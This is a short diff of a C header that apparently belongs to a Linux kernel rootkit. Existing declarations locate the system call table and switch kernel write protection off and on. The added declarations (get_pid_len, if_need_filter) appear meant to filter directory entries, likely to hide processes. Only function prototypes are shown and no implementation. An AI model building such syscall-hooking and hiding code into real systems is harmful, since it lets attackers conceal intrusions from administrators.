@@ -16,3 +16,5 @@ unsigned long ** get_sys_call_table_by_sys_close(void);
 void disable_write_protection(void);
 void enable_write_protection(void);
 
+int get_pid_len(char *d_name);
+int if_need_filter(char *d_name);
